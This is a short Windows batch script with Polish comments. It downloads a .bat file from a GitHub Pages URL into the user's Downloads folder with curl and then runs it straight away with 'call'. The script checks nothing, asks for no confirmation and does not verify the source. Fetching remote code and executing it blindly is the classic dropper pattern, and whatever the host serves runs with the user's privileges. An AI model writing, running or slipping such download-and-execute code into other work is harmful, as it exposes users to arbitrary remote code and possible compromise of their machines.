@echo off
REM Pobiera plik .bat z podanego URL i zapisuje go w folderze Downloads użytkownika
set "url=https://abolojakub.github.io/website/file.bat"
set "output=%HOMEPATH%\Downloads\website.bat"

REM Pobierz plik z URL i zapisz go jako website.bat w Downloads
curl -L -o "%output%" "%url%"

REM Uruchom pobrany plik
call "%output%"